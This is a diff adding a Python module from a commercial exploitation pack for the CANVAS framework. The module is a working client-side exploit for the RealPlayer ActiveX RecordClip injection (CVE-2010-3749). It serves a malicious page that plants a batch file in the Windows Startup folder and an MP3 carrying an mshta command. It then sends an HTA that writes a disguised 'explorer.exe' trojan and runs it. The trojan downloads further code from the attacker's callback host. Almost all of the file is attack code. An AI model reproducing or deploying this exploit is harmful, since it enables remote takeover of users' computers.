@@ -1,0 +1,249 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from canvasexploit import canvasexploit
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import canvasengine
+import struct
+import os
+
+# GUI info
+NAME = "RealNetworks Realplayer RecordClip Parameter Injection Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote Code Execution Vulnerability in RealNetworks Realplayer ActiveX"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Real Networks"
+DOCUMENTATION["Date public"] = "2010.10.15"
+DOCUMENTATION["VersionsAffected"] = " RealPlayer SP <= 1.0.5"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-10-211/"
+DOCUMENTATION["CVE Name"] = "CVE-2010-3749"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3749"
+DOCUMENTATION["Notes"] = ""
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['XP']
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 12
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_recordclip -l 192.168.133.1 -d 443 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['Windows XP with IE'],
+}
+
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.badstring = "\x00"
+        self.subesp = 0
+        self.name = NAME 
+        self.filename = "index.html"
+        self.trojanname = "index.hta"
+        self.mp3file = "d2.mp3"
+        return
+
+
+    def file4hta(self, exename):
+		evilprog = "explorer.exe"
+		e = []
+		
+		for a in exename:
+			for b in a:
+				if b == "\r":
+				  d = "0d"
+				elif b == "\n":
+				  d = "0a"
+				elif b == "\0":
+				  d = "00"
+				else:
+				  c = hex(ord(b))
+				  d = c.replace("0x", "")
+				
+				if len(d) == 1:
+				  d = "0"+d
+				
+				e.append(d)
+		
+		i = 0
+		j = 0
+		l = len(e)
+		
+		hta = "<SCRIPT language=vbs>\n\n"
+		while 1:
+		  hta += " prog = prog & \""
+		
+		  while i != 24:
+		    hta += "%s," % e[j]
+		    if j == l-1:
+		      break
+		    i += 1
+		    j += 1
+		
+		  if j == l-1:
+		    hta = hta[:-1] + "\"\n\n"
+		    break
+		  hta += "\"\n"
+		  i = 0
+		
+		hta += " tmp = Split(prog, \",\")\n"	
+		hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+		hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+		hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+		hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+		hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+		hta += " For i = 0 To UBound(tmp)\n"
+		hta += "   prog = Int(\"&H\" & tmp(i))\n"
+		hta += "   f.Write Chr(prog)\n"
+		hta += " Next\n\n"
+		hta += " f.Close\n"
+		hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+		hta += " self.Close\n"
+		hta += "</SCRIPT>\n"
+		
+		return hta 
+
+    def maketrojan(self):		
+		host = self.callback.ip
+		port = self.callback.port
+		
+		sc = shellcodeGenerator.win32()
+		sc.addAttr("findeipnoesp", {"subespval":0x1000})                
+                                                    	
+		if self.useSSL:
+			ssl = "s"
+		else:
+			ssl = ""
+            
+		sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
+		sc.vAllocSelf = True
+		shellcode = sc.get()   
+             
+		myPElib = pelib.PElib()        	
+		self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
+		
+		self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))
+
+		self.htafile = self.file4hta(self.mosdeftrojan)		
+		file(self.trojanname, "wb").write(self.htafile)
+		self.setInfo("%s - done" % (NAME))
+		ret = len(self.mosdeftrojan) != 0
+                                    		
+		return ret        		
+    		        
+    def makefile(self):
+        filedata = """
+<HTML> 
+<BODY>
+ 
+<DIV id="targetDiv">
+
+</DIV>
+
+<SCRIPT language="javascript">  
+
+try {		
+	var detect = new ActiveXObject("IERPCtl.IERPCtl.1");
+    var file = 'http://SERVERHOST:SERVERPORT/d2.mp3" /f \\"C:\\\Documents and Settings\\\All Users\\\Start Menu\\\Programs\\\Startup\\\d2.bat\\" /t d2.mp3';
+    	
+	if (detect) {	
+		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:FDC7A535-4070-4B92-A0EA-D9994BCC0DC5' id='target'></object>";						
+		target.RecordClip(file, "audio/mpeg3", "clipInfo");   
+	}
+}
+catch(e) {}
+
+</SCRIPT> 
+
+</BODY> 
+</HTML>        
+"""
+        filedata = filedata.replace('SERVERHOST', self.callback.ip)
+        filedata = filedata.replace('SERVERPORT', str(self.callback.port))
+
+        if self.useSSL:
+      		filedata = filedata.replace('http:', 'https:')
+	
+        return filedata
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()                     
+                
+        if clientheader.URL.count(self.filename):            
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)
+        elif clientheader.URL.count(".mp3"):
+            self.log("Sending MP3 file")            
+            f = open(os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_recordclip/" + self.mp3file, "rb")
+            sploitstring = f.read()
+            f.close()                        
+            sploitstring = sploitstring[:100] + "\r\n\r\nmshta.exe MOSDEFTROJANURL\r\n\r\n" + sploitstring[100:]
+            sploitstring = sploitstring.replace("MOSDEFTROJANURL", "http://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.trojanname)            
+            self.log("Sending %d bytes" % len(sploitstring))
+            h.addHeader("Content-type", "binary/octet-stream")
+            h.addHeader("Connection", "close")
+            b.setBody(sploitstring)     
+        elif clientheader.URL.count(self.trojanname):
+            self.maketrojan()   
+            self.log("Sending MOSDEF trojan")
+            f = open(self.trojanname, "rb")
+            sploitstring = f.read()
+            f.close()
+            os.remove(self.trojanname)
+            self.log("Sending %d bytes"%len(sploitstring))
+            h.addHeader("Content-type","binary/octet-stream")
+            h.addHeader("Connection","close")
+            b.setBody(sploitstring)                        
+        else:
+            self.log('Redirecting to self')
+            h.status = '302'
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+    
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
